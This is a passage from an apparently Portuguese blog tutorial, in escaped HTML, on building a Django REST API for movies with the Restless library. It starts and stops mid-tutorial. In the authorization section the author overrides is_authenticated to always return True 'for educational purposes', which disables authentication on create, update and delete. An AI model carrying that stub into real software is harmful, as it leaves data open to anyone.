    &lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;255&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;TextField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blank&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;null&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Podemos partir agora para a criação dos &lt;em&gt;resources&lt;/em&gt;.&lt;/p&gt;
&lt;h2&gt;Resourcers e Preparers&lt;/h2&gt;
&lt;p&gt;&lt;em&gt;Resources&lt;/em&gt; são classes que descrevem um recurso &lt;em&gt;REST&lt;/em&gt;, dentro do &lt;em&gt;Restless&lt;/em&gt;. É através deles
que definiremos &lt;em&gt;endpoints&lt;/em&gt; e todos os verbos suportados. Já os &lt;em&gt;Preparers&lt;/em&gt; fazem
o papel do "mapping" do objeto que você está expondo na API.&lt;/p&gt;
&lt;p&gt;Para começar, vamos criar um arquivo &lt;code&gt;api.py&lt;/code&gt; dentro do nosso &lt;em&gt;app&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/api.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;restless.dj&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;DjangoResource&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;restless.preparers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;FieldsPreparer&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;movies.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Movie&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MovieResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DjangoResource&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;preparer&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;FieldsPreparer&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fields&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;id&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;O &lt;code&gt;DjangoResource&lt;/code&gt; é um &lt;em&gt;Resource&lt;/em&gt; &lt;em&gt;Restless&lt;/em&gt; com algumas "facilidades" para funcionar dentro do
framework &lt;em&gt;Django&lt;/em&gt;. Uma dessas facilidades é o roteamento (que veremos logo abaixo).&lt;/p&gt;
&lt;p&gt;Todo recurso precisa de um atributo &lt;code&gt;preparer&lt;/code&gt;, é através dele que o &lt;em&gt;Resource&lt;/em&gt; fará o "de-para"
dos campos no seu banco dados, e os campos que serão exibidos em sua &lt;em&gt;API&lt;/em&gt;. Nesse caso
estamos utilizando o &lt;code&gt;FieldsPreparer&lt;/code&gt;, e através de um dicionário (onde a chave é o nome do campo
na &lt;em&gt;API&lt;/em&gt; e o valor é o caminho para o dado) fazemos o mapeamento necessário para expor os
dados do recurso.&lt;/p&gt;
&lt;p&gt;O método &lt;code&gt;list&lt;/code&gt; será o responsável por responder uma rota &lt;code&gt;GET /movies/&lt;/code&gt; em nosso projeto. Aqui já
podemos ver o conceito de &lt;em&gt;BYOD&lt;/em&gt; (&lt;em&gt;Bring Your Own Data&lt;/em&gt;) em ação. O &lt;em&gt;Restless&lt;/em&gt; não "introspecta"
os seus &lt;em&gt;models&lt;/em&gt; &lt;em&gt;Django&lt;/em&gt; para entender o que e como ele deve expor dados. É necessário que
você faça isso explicitamente... é esse princípio que torna fácil o trabalho da biblioteca com outros
&lt;em&gt;frameworks&lt;/em&gt; e bancos de dados.&lt;/p&gt;
&lt;p&gt;Falta atualizar o &lt;code&gt;urls.py&lt;/code&gt; para que o &lt;em&gt;Django&lt;/em&gt; possa fazer o roteamento dos endereços
com as &lt;em&gt;views&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# urls.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.conf.urls&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;movies.api&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;MovieResource&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sa"&gt;r&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;movies/&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;include&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;MovieResource&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;urls&lt;/span&gt;&lt;span class="p"&gt;())),&lt;/span&gt;
&lt;span class="p"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Aquele &lt;code&gt;.urls()&lt;/code&gt; é uma das facilidades que o &lt;code&gt;DjangoResource&lt;/code&gt; oferece. Caso você esteja trabalhando
com algum outro &lt;em&gt;framework&lt;/em&gt;, você pode estender o comportamento de &lt;code&gt;Resource&lt;/code&gt; e resolver o roteamento
manualmente.&lt;/p&gt;
&lt;p&gt;Pronto! O &lt;em&gt;endpoint&lt;/em&gt; &lt;code&gt;movies/&lt;/code&gt; já está respondendo:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;X&lt;/span&gt; &lt;span class="nv"&gt;GET&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;localhost&lt;/span&gt;:&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nv"&gt;json_pp&lt;/span&gt;

{
   &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;objects&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; : [
      {
         &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;description&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;The Rebel Alliance makes a risky move to steal the plans for the Death Star, setting up the epic saga to follow. (133 mins.)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,
         &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;id&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;7e383f9c-5dc4-4b0d-9864-71e05a5d271b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,
         &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;title&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; : &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;Rogue One&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
      },
      &lt;span class="ss"&gt;(&lt;/span&gt;...&lt;span class="ss"&gt;)&lt;/span&gt;
   ]
}
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Criação e autorização&lt;/h2&gt;
&lt;p&gt;Para adicionar um filme, faremos um POST em &lt;code&gt;movies/&lt;/code&gt;, para isso, precisamos adicionar um método &lt;code&gt;create&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/api.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MovieResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DjangoResource&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mais uma vez o &lt;em&gt;Restless&lt;/em&gt; não introspecta o modelo, logo, é necessário fazer a validação e criação do objeto
em banco "na mão".&lt;/p&gt;
&lt;p&gt;Vamos testar se o comportamento é o esperado:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ curl -X POST -H &lt;span class="s2"&gt;&amp;quot;Content-Type: application/json&amp;quot;&lt;/span&gt; -d &lt;span class="s1"&gt;&amp;#39;{&amp;quot;title&amp;quot;: &amp;quot;just a test&amp;quot;, &amp;quot;description&amp;quot;: &amp;quot;foo bar&amp;quot;}&amp;#39;&lt;/span&gt; http://localhost:8000/movies/
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Provavelmente retornará um &lt;em&gt;exception&lt;/em&gt; dizendo que o acesso não foi autorizado. O &lt;em&gt;Restless&lt;/em&gt; por padrão espera
que todo o &lt;code&gt;POST&lt;/code&gt;, &lt;code&gt;PUT&lt;/code&gt; e &lt;code&gt;DELETE&lt;/code&gt; seja realizado através de uma requisição autenticada. Para isso, antes
de executar cada verbo, ele consulta o método &lt;code&gt;is_authenticated&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center" src="/images/blog/deathstar.jpg" width="600" height="317" title="is_authenticated retornando True é pior que o problema de segurança na Estrela da Morte (movieweb.com)" alt="is_authenticated retornando True é pior que o problema de segurança na Estrela da Morte (movieweb.com)"&gt;&lt;/p&gt;
&lt;p&gt;Para fins educacionais, vamos informar à biblioteca que todas as requisições são aceitas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/api.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MovieResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DjangoResource&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;create&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
            &lt;span class="n"&gt;title&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
            &lt;span class="n"&gt;description&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;
        &lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;is_authenticated&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Mais uma vez executamos o &lt;em&gt;POST&lt;/em&gt; via &lt;code&gt;curl&lt;/code&gt;, e &lt;em&gt;voilà&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;title&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;just a test&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;bd02d0eb-4b75-4bfe-8222-ba24f7a1cad4&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;description&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;foo bar&amp;quot;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Verbos por ID&lt;/h2&gt;
&lt;p&gt;Já listamos e criamos novos filmes. Como fazemos para ver os detalhes de um filme através do
seu &lt;em&gt;ID&lt;/em&gt;? Simples! O método &lt;code&gt;detail&lt;/code&gt; resolve essa para a gente:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/api.py&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.shortcuts&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;get_object_or_404&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MovieResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DjangoResource&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;get_object_or_404&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Um &lt;code&gt;GET&lt;/code&gt; para &lt;code&gt;movies/{id}&lt;/code&gt; retornará os detalhes do recurso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ &lt;span class="nv"&gt;curl&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="nv"&gt;X&lt;/span&gt; &lt;span class="nv"&gt;GET&lt;/span&gt; &lt;span class="nv"&gt;http&lt;/span&gt;:&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="nv"&gt;localhost&lt;/span&gt;:&lt;span class="mi"&gt;8000&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nv"&gt;movies&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="nv"&gt;e383f9c&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="nv"&gt;dc4&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="nv"&gt;b0d&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;9864&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;71&lt;/span&gt;&lt;span class="nv"&gt;e05a5d271b&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;

{
  &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;description&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;The Rebel Alliance makes a risky move to steal the plans for the Death Star, setting up the epic saga to follow. (133 mins.)&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;id&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;7e383f9c-5dc4-4b0d-9864-71e05a5d271b&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;,
  &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;title&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;: &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="s"&gt;Rogue One&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Note que o &lt;code&gt;DjangoResource&lt;/code&gt; resolveu a passagem do parâmetro &lt;code&gt;pk&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Para finalizar, vamos criar os métodos &lt;code&gt;update&lt;/code&gt; e &lt;code&gt;delete&lt;/code&gt;, que serão responsáveis
por atualizar e remover o recurso:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# movies/api.py&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;MovieResource&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;DjangoResource&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;get_object_or_404&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Movie&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;update&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

        &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;title&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;title&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;description&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;description&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
        &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;save&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;movie&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;movie&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;detail&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pk&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="n"&gt;movie&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;delete&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Assim como o método &lt;code&gt;create&lt;/code&gt;, não há nenhuma "mágica" resolvendo a operação para a gente.
Precisamos explicitamente realizar a atualização e remoção do dado através do &lt;em&gt;ORM&lt;/em&gt; do &lt;em&gt;Django&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Agora somos capazes de atualizar:&lt;/p&gt;
